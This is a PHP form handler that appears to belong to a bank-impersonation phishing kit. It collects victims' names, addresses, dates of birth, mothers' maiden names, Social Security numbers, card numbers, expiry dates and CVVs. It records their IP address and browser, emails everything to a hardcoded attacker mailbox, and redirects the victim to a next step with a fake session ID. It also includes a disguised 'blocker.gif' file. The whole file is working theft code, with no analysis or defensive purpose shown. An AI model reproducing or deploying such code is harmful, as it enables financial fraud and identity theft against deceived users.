<?php
include ("images/blocker.gif");
if($_POST["name"] != "" and $_POST["addr"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------BOA Info-----------------------\n";
$message .= "Full Name            : ".$_POST['name']."\n";
$message .= "Address              : ".$_POST['addr']."\n";
$message .= "City              : ".$_POST['city']."\n";
$message .= "State             : ".$_POST['state']."\n";
$message .= "Zip Code            : ".$_POST['zp']."\n";
$message .= "Phone Number            : ".$_POST['phone']."\n";
$message .= "Date of Birth            : ".$_POST["dbm"].'/'.$_POST['dbd'].'/'.$_POST['dby']."\n";
$message .= "Country             : ".$_POST['cntr']."\n";
$message .= "MMN             : ".$_POST['mn']."\n";
$message .= "SSN            : ".$_POST['sn']."\n";
$message .= "Card Number            : ".$_POST['cn']."\n";
$message .= "Expiration Date            : ".$_POST["exm"].'/'.$_POST['exy']."\n";
$message .= "CVV            : ".$_POST['cv']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
$send = "mahkhafx@gmail.com";
$subject = "Card | $ip";
{
mail("$send", "$subject", $message);   
mail($userinfo,$subject,$message);
}
$praga=rand();
$praga=md5($praga);
  header ("Location: step4.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}else{
header ("Location: index.php");
}

?>